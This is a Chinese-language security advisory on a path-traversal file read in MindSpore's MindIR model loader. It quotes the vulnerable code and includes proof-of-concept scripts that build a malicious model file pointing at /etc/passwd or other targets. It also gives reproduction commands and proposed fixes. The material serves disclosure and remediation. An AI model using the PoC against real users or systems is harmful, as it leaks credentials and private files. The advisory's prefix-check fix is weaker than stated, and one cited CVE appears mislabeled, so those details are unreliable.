# MS-2025-001: MindIR External Data 路径穿越导致任意文件读取

## 基本信息

| 字段 | 值 |
|------|-----|
| **项目** | [mindspore-ai/mindspore](https://github.com/mindspore-ai/mindspore) |
| **版本** | 2.4.0rc1 (main branch 截至 2026-05-19) |
| **严重性** | Critical |
| **CVSS 3.1** | 8.6 (AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N) |
| **CWE** | CWE-22 (Path Traversal) |
| **发现日期** | 2026-05-19 |
| **攻击向量** | 本地/需要用户加载恶意模型文件 |
| **影响组件** | `mindspore/core/load_mindir/load_model.cc` |

## 漏洞概述

MindSpore 在加载 MindIR 模型文件时，如果模型使用了外部数据存储（`external_data`），其 `location` 字段会被直接拼接到文件路径中用于读取张量数据。该字段来自 protobuf 反序列化，完全由模型文件控制，**没有任何路径校验或规范化**。

攻击者可以构造一个恶意 MindIR 文件，将 `external_data.location` 设置为包含 `../` 的路径（如 `../../../../etc/passwd`），当受害者加载该模型时，框架会读取服务器/用户系统上的任意文件内容并将其加载到张量内存中。

## 影响

- **信息泄露**：读取系统敏感文件（`/etc/shadow`、SSH keys、环境变量、数据库凭证等）
- **模型投毒链**：在模型分享/下载场景中（如 ModelZoo、HuggingFace Hub），攻击者上传恶意模型文件，受害者加载后泄露本机敏感数据
- **云环境凭证窃取**：在 AI 训练平台上，可能读取其他用户的文件或云凭证

## 漏洞代码

**文件**: `mindspore/core/load_mindir/load_model.cc` (第941行)

```cpp
bool MSANFModelParser::GetTensorDataFromExternal(const mind_ir::TensorProto &tensor_proto,
                                                 const tensor::TensorPtr &tensor_info) {
  if (!tensor_proto.has_external_data()) {
    return false;
  }
  const unsigned char *data = nullptr;
  auto it = tenor_data_.find(tensor_proto.external_data().location());
  if (it != tenor_data_.end()) {
    data = it->second.get();
  } else {
    // ⚠️ 第941行：直接拼接，无任何路径校验！
    std::string file = mindir_path_ + "/" + tensor_proto.external_data().location();
    
    // ... 后续直接打开并读取该文件 ...
    std::basic_ifstream<char> fid(file, std::ios::in | std::ios::binary);
    // ... 读取全部内容 ...
  }
```

**关键缺失**：
- 无 `../` 过滤
- 无 `realpath()` 规范化后的目录前缀校验
- 无文件路径白名单
- 无符号链接检查

## PoC 构造思路

```python
"""
构造恶意 MindIR 文件的概念验证
利用 external_data.location 路径穿越读取任意文件
"""
import struct
from mindspore.train.mind_ir_pb2 import ModelProto, TensorProto

# 1. 创建一个最小的合法 MindIR 模型
model = ModelProto()
model.ir_version = 6
model.producer_name = "MindSpore"

# 2. 添加一个参数，使用 external_data 指向恶意路径
param = model.graph.parameter.add()
param.name = "Default/weight"
param.data_type = TensorProto.FLOAT
param.dims.extend([1])  # shape = [1]

# 3. 设置 external_data 的 location 为路径穿越 payload
param.external_data.location = "../../../../etc/passwd"  # ← 路径穿越！
param.external_data.offset = 0
param.external_data.length = 4096  # 读取前 4096 字节

# 4. 保存恶意模型文件
with open("malicious_model.mindir", "wb") as f:
    f.write(model.SerializeToString())

# 5. 同时创建模型目录结构（MindIR 加载器期望的格式）
# mkdir -p malicious_model/
# mv malicious_model.mindir malicious_model/

print("恶意模型文件已创建: malicious_model.mindir")
print("当受害者执行以下代码时触发:")
print("  import mindspore")
print("  graph = mindspore.load('malicious_model.mindir')")
print("  # /etc/passwd 的内容会被读入到张量内存中")
```

## 本地复现步骤

### 环境搭建

```bash
# 安装 MindSpore (CPU 版本即可复现)
pip install mindspore==2.4.0rc1

# 或从源码构建
git clone https://github.com/mindspore-ai/mindspore.git
cd mindspore
bash build.sh -e cpu
pip install output/mindspore-*.whl
```

### 复现

```bash
# Step 1: 创建 PoC 脚本
cat > poc_path_traversal.py << 'EOF'
import os
import sys
import struct

# 需要 protobuf 定义
# pip install protobuf
from mindspore.train.mind_ir_pb2 import ModelProto

def create_malicious_mindir(target_file, output_dir="./poc_model"):
    """创建一个恶意 MindIR 文件，读取 target_file"""
    os.makedirs(output_dir, exist_ok=True)
    
    model = ModelProto()
    model.ir_version = 6
    model.producer_name = "MindSpore"
    model.model_version = 1
    
    # 添加图
    graph = model.graph
    graph.name = "poc_graph"
    
    # 添加恶意参数 - external_data 指向目标文件
    param = graph.parameter.add()
    param.name = "Default/param0:param0"
    
    # 计算相对路径穿越
    # mindir_path_ 通常是模型文件所在目录
    # 我们需要从该目录穿越到目标文件
    relative_path = os.path.relpath(target_file, output_dir)
    
    # 设置 external_data
    param.external_data.location = relative_path
    param.external_data.offset = 0
    param.external_data.length = 4096
    
    # 设置 tensor 属性
    param.data_type = 1  # FLOAT32
    param.dims.extend([1024])  # 需要足够大容纳文件内容
    
    # 保存
    mindir_path = os.path.join(output_dir, "poc_model.mindir")
    with open(mindir_path, "wb") as f:
        f.write(model.SerializeToString())
    
    print(f"[+] 恶意模型已创建: {mindir_path}")
    print(f"[+] 目标文件: {target_file}")
    print(f"[+] 穿越路径: {relative_path}")
    return mindir_path

def load_and_extract(mindir_path):
    """加载恶意模型并提取泄露的数据"""
    import mindspore
    try:
        graph = mindspore.load(mindir_path)
        print("[+] 模型加载成功 - 文件内容已读入张量内存")
        # 在实际利用中，攻击者需要通过推理流程提取张量数据
        return True
    except Exception as e:
        print(f"[-] 加载失败: {e}")
        # 即使抛出异常，文件可能已被读取到内存
        return False

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "/etc/hostname"
    mindir_path = create_malicious_mindir(target)
    print(f"\n[*] 执行: mindspore.load('{mindir_path}')")
    load_and_extract(mindir_path)
EOF

# Step 2: 运行 PoC
python3 poc_path_traversal.py /etc/hostname

# Step 3: 验证文件被读取
# 可以通过 strace 确认文件系统调用：
strace -e trace=open,openat python3 -c "
import mindspore
mindspore.load('./poc_model/poc_model.mindir')
" 2>&1 | grep -E "passwd|hostname|shadow"
```

### 关键观察点

```bash
# 在 strace 输出中应该看到类似：
# openat(AT_FDCWD, "./poc_model/../../../../etc/hostname", O_RDONLY) = 3

# 这证明框架尝试打开穿越后的路径
```

## 修复建议

### 方案1（推荐）：路径规范化 + 目录前缀校验

```cpp
bool MSANFModelParser::GetTensorDataFromExternal(const mind_ir::TensorProto &tensor_proto,
                                                 const tensor::TensorPtr &tensor_info) {
  // ... existing checks ...
  
  std::string file = mindir_path_ + "/" + tensor_proto.external_data().location();
  
  // 修复：规范化路径并校验是否在 mindir_path_ 目录下
  char resolved_path[PATH_MAX];
  if (realpath(file.c_str(), resolved_path) == nullptr) {
    MS_LOG(ERROR) << "Failed to resolve path: " << file;
    return false;
  }
  
  char resolved_base[PATH_MAX];
  if (realpath(mindir_path_.c_str(), resolved_base) == nullptr) {
    MS_LOG(ERROR) << "Failed to resolve base path: " << mindir_path_;
    return false;
  }
  
  std::string resolved_file(resolved_path);
  std::string resolved_base_str(resolved_base);
  
  // 确保解析后的路径在模型目录内
  if (resolved_file.find(resolved_base_str) != 0) {
    MS_LOG(ERROR) << "Path traversal detected! External data location '"
                  << tensor_proto.external_data().location()
                  << "' resolves to '" << resolved_file
                  << "' which is outside the model directory.";
    return false;
  }
  
  // ... continue with file loading ...
}
```

### 方案2：过滤危险字符

```cpp
// 最小修改：拒绝包含 .. 的路径
const auto &location = tensor_proto.external_data().location();
if (location.find("..") != std::string::npos || location[0] == '/') {
  MS_LOG(ERROR) << "Invalid external data location: " << location;
  return false;
}
```

## 参考

- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)
- [CVE-2024-3660: TensorFlow arbitrary file read via SavedModel](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [MindSpore Security Policy](https://gitee.com/mindspore/community/blob/master/security/README.md)
